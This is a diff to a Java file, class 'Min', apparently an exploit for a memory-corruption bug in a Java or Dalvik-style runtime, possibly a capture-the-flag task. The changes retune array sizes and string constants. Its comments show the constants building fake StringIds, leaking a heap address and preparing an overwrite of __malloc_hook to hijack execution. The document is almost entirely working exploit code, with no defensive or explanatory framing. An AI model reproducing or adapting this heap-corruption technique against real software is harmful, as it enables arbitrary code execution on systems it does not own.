@@ -59,12 +59,14 @@ public class Min {
     //public static void main(String[] args) {
     //}
     public static void foo() {
-        int a[] = new int[(0xff-1-0x20)*0x1000/8-5];
+        int a[] = new int[(0xff-1-0x20-2)*0x1000/8-5];
         String x;
-        x = "-167";  // patch the 2nd bytes to StringIds pointer, offset to StringIds, (0xb0-0x19)
+        x = "-183";  // patch the 2nd bytes to StringIds pointer, offset to StringIds, (0xb0-0x19)
 
-        x = "22";   // Start of Fake StringIds inside Array, 0x70/4-6
-        x = "23";   // 12 indexes to index fake StringId on-the-fly
+        x = "20";   // Start of Fake StringIds inside Array, 0x70/4-6
+        x = "21";   // 12 indexes to index fake StringId on-the-fly
+        x = "22";
+        x = "23";
         x = "24";
         x = "25";
         x = "26";
@@ -73,15 +75,15 @@ public class Min {
         x = "29";
         x = "30";
         x = "31";
-        x = "32";
+
+        x = "32";   // 4 indexes to faked string index to patch __malloc_hook
         x = "33";
-
-        x = "34";   // 4 indexes to faked string index to patch __malloc_hook
+        x = "34";
         x = "35";
-        x = "36";
-        x = "37";
 
-        x = "38";   // start of Fake string data, each new index string takes 10 digits + 1 byte len + 1 null byte
+        x = "36";   // start of Fake string data, each new index string takes 10 digits + 1 byte len + 1 null byte
+        x = "37";
+        x = "38";
         x = "39";
         x = "40";
         x = "41";
@@ -91,13 +93,11 @@ public class Min {
         x = "45";
         x = "46";
         x = "47";
-        x = "48";
-        x = "49";
 
 
-        x = "-31";   // Leak heap address, xx58, string base address at xxb8
-        x = "-30";   // no need to leak the 1st byte (0x58), gonna patch it anyway
-        x = "-29";
+        x = "-39";   // Leak heap address, xx58, string base address at xxb8
+        x = "-38";   // no need to leak the 1st byte (0x58), gonna patch it anyway
+        x = "-37";
 
         foo();
         foo();
